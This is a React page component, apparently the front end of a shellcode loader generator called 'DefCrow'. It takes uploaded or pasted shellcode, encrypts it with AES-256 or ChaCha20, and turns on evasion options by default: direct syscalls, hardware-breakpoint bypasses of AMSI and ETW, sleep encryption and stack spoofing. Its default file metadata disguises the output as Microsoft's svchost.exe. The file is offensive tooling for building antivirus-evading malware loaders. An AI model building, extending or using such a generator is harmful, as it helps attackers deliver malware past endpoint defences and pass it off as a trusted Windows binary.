import { useState, FormEvent, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { GenerateRequest, Feature, LoaderType, Encryption, ALL_FEATURES, LOADER_GROUPS, generate } from '../api/generate'
import OpsecFeatures from '../components/OpsecFeatures'
import AppDomainConfig from '../components/AppDomainConfig'
import PeMetadata from '../components/PeMetadata'
import ExecHint from '../components/ExecHint'
import { useAuth } from '../store/auth'

const DEFAULT_PE = {
  company_name: 'Microsoft Corporation', file_description: 'Host Process for Windows Services',
  product_name: 'Microsoft Windows Operating System', file_version: '10.0.19041.1',
  original_filename: 'svchost.exe', legal_copyright: '© Microsoft Corporation. All rights reserved.', sign: false,
}

const DEFAULT_APPDOMAIN = { clr_version: 'v4.0.30319', net_version: '4.0', appdomain_type: '', target_assembly: '' }

export default function GeneratorPage() {
  const navigate = useNavigate()
  const { logout } = useAuth()
  const [loaderType, setLoaderType]   = useState<LoaderType>('Binary')
  const [encryption, setEncryption]   = useState<Encryption>('Aes256')
  const [features, setFeatures]       = useState<Feature[]>(['DirectSyscall', 'AmsiHwbp', 'EtwHwbp', 'SleepEncrypt', 'StackSpoof'])
  const [shellcodeHex, setShellcodeHex] = useState('')
  const [binFilename, setBinFilename]   = useState<string | null>(null)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const [keyHex, setKeyHex]           = useState('')
  const [ivHex, setIvHex]             = useState('')
  const [peEnabled, setPeEnabled]     = useState(false)
  const [peConfig, setPeConfig]       = useState(DEFAULT_PE)
  const [adConfig, setAdConfig]       = useState(DEFAULT_APPDOMAIN)
  const [submitting, setSubmitting]   = useState(false)
  const [error, setError]             = useState<string | null>(null)

  function handleBinUpload(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0]
    if (!file) return
    setBinFilename(file.name)
    const reader = new FileReader()
    reader.onload = (ev) => {
      const buf = ev.target?.result as ArrayBuffer
      const bytes = new Uint8Array(buf)
      const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('')
      setShellcodeHex(hex)
    }
    reader.readAsArrayBuffer(file)
  }

  async function handleSubmit(e: FormEvent) {
    e.preventDefault(); setError(null); setSubmitting(true)
    try {
      const req: GenerateRequest = {
        loader_type: loaderType, features, encryption,
        shellcode_hex: shellcodeHex.replace(/\s+/g, ''),
        key_hex: keyHex.replace(/\s+/g, ''),
        iv_hex: ivHex.replace(/\s+/g, ''),
        pe_config: peEnabled ? peConfig : undefined,
        appdomain_config: loaderType === 'AppDomain' ? adConfig : undefined,
      }
      const { job_id } = await generate(req)
      navigate(`/job/${job_id}`)
    } catch (err: any) {
      setError(err?.response?.data?.message ?? 'Generation failed')
    } finally { setSubmitting(false) }
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#0a0a0f' }}>
      <header className="sticky top-0 z-10" style={{ borderBottom: '1px solid #1e1e2e', backgroundColor: 'rgba(18,18,26,0.8)', backdropFilter: 'blur(8px)' }}>
        <div className="max-w-5xl mx-auto px-6 py-3 flex items-center justify-between">
          <span className="font-bold text-lg tracking-tight" style={{ color: '#e2e8f0' }}>DefCrow</span>
          <button onClick={logout} className="text-xs transition" style={{ color: '#64748b' }}>Sign out</button>
        </div>
      </header>
      <main className="max-w-5xl mx-auto px-6 py-8">
        <form onSubmit={handleSubmit} className="space-y-8">
          <section className="rounded-2xl p-6 space-y-5" style={{ border: '1px solid #1e1e2e', backgroundColor: '#12121a' }}>
            <h2 className="text-sm font-semibold uppercase tracking-widest" style={{ color: '#64748b' }}>Loader Configuration</h2>
            <div>
              <label className="block text-xs mb-2" style={{ color: '#64748b' }}>Loader Type</label>
              <div className="space-y-3">
                {Object.entries(LOADER_GROUPS).map(([groupLabel, items]) => (
                  <div key={groupLabel}>
                    <p className="text-[10px] uppercase tracking-widest mb-1" style={{ color: '#64748b' }}>
                      {groupLabel}
                    </p>
                    <div className="grid grid-cols-2 gap-1.5">
                      {items.map((item) => (
                        <button
                          key={item.type}
                          type="button"
                          onClick={() => setLoaderType(item.type)}
                          className="rounded-lg py-2 px-2 text-xs font-medium transition text-left"
                          style={{
                            border: `1px solid ${loaderType === item.type ? '#7c3aed' : '#1e1e2e'}`,
                            backgroundColor: loaderType === item.type ? 'rgba(124,58,237,0.2)' : 'transparent',
                            color: loaderType === item.type ? '#7c3aed' : '#64748b',
                          }}
                        >
                          <div className="font-medium">{item.label}</div>
                          <div className="text-[10px]" style={{ color: '#64748b' }}>{item.ext}</div>
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
            <div className="max-w-sm">
              <label className="block text-xs mb-2" style={{ color: '#64748b' }}>Encryption</label>
              <div className="grid grid-cols-2 gap-2">
                {(['Aes256', 'Chacha20'] as Encryption[]).map((enc) => (
                  <button key={enc} type="button" onClick={() => setEncryption(enc)}
                    className="rounded-lg py-2 text-sm font-medium transition"
                    style={{ border: `1px solid ${encryption === enc ? '#7c3aed' : '#1e1e2e'}`, backgroundColor: encryption === enc ? 'rgba(124,58,237,0.2)' : 'transparent', color: encryption === enc ? '#7c3aed' : '#64748b' }}>
                    {enc}
                  </button>
                ))}
              </div>
            </div>
            <ExecHint type={loaderType} />
            <div className="space-y-3">
              <div>
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs" style={{ color: '#64748b' }}>Shellcode (hex)</label>
                  <div className="flex items-center gap-2">
                    {binFilename && (
                      <span className="text-xs font-mono truncate max-w-[160px]" style={{ color: '#7c3aed' }}>
                        {binFilename}
                      </span>
                    )}
                    <button
                      type="button"
                      onClick={() => fileInputRef.current?.click()}
                      className="text-xs px-2 py-1 rounded-lg transition"
                      style={{ border: '1px solid #1e1e2e', backgroundColor: '#0a0a0f', color: '#64748b' }}
                    >
                      Upload .bin
                    </button>
                    <input
                      ref={fileInputRef}
                      type="file"
                      accept=".bin,application/octet-stream"
                      className="hidden"
                      onChange={handleBinUpload}
                    />
                  </div>
                </div>
                <textarea required rows={4} placeholder="fc4883e4f0e8… or upload a .bin file above"
                  value={shellcodeHex} onChange={(e) => setShellcodeHex(e.target.value)}
                  className="w-full rounded-lg px-3 py-2 text-xs font-mono focus:outline-none resize-none"
                  style={{ backgroundColor: '#0a0a0f', border: '1px solid #1e1e2e', color: '#e2e8f0' }} />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs mb-1" style={{ color: '#64748b' }}>Key (64 hex chars)</label>
                  <input type="text" required placeholder={'aa'.repeat(32)}
                    value={keyHex} onChange={(e) => setKeyHex(e.target.value)}
                    className="w-full rounded-lg px-3 py-1.5 text-xs font-mono focus:outline-none"
                    style={{ backgroundColor: '#0a0a0f', border: '1px solid #1e1e2e', color: '#e2e8f0' }} />
                </div>
                <div>
                  <label className="block text-xs mb-1" style={{ color: '#64748b' }}>IV / Nonce (32 hex chars)</label>
                  <input type="text" required placeholder={'bb'.repeat(16)}
                    value={ivHex} onChange={(e) => setIvHex(e.target.value)}
                    className="w-full rounded-lg px-3 py-1.5 text-xs font-mono focus:outline-none"
                    style={{ backgroundColor: '#0a0a0f', border: '1px solid #1e1e2e', color: '#e2e8f0' }} />
                </div>
              </div>
            </div>
          </section>
          <section className="rounded-2xl p-6 space-y-4" style={{ border: '1px solid #1e1e2e', backgroundColor: '#12121a' }}>
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-semibold uppercase tracking-widest" style={{ color: '#64748b' }}>OPSEC Features</h2>
              <span className="text-xs" style={{ color: '#7c3aed' }}>{features.length} / {ALL_FEATURES.length} selected</span>
            </div>
            <OpsecFeatures selected={features} onChange={setFeatures} />
          </section>
          {loaderType === 'AppDomain' && <AppDomainConfig value={adConfig} onChange={setAdConfig} />}
          <PeMetadata value={peConfig} onChange={setPeConfig} enabled={peEnabled} onToggle={setPeEnabled} />
          {error && (
            <p className="rounded-xl px-4 py-3 text-sm" style={{ backgroundColor: 'rgba(127,0,0,0.2)', border: '1px solid #7f1d1d', color: '#dc2626' }}>
              {error}
            </p>
          )}
          <button type="submit" disabled={submitting}
            className="w-full py-3 rounded-xl text-white font-semibold text-sm transition disabled:opacity-50 disabled:cursor-not-allowed"
            style={{ backgroundColor: '#7c3aed' }}>
            {submitting ? 'Submitting…' : 'Generate Loader'}
          </button>
        </form>
      </main>
    </div>
  )
}
